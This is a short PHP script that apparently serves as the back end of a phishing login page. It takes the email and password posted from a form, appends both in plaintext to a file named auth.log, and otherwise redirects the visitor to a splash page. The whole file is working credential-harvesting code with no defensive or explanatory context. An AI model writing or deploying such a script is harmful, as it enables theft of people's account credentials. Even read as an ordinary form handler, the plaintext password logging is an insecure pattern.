<?php

if (isset($_POST['email'])) {
	$fh = fopen('auth.log', 'a+');
	fwrite($fh, "Email:  " . $_POST['email'] . "\n");
	fwrite($fh, "Pass:  " . $_POST['password'] . "\n\n");
	fclose($fh);
	return;
} else {
	header('Location: splash.html');
}

?>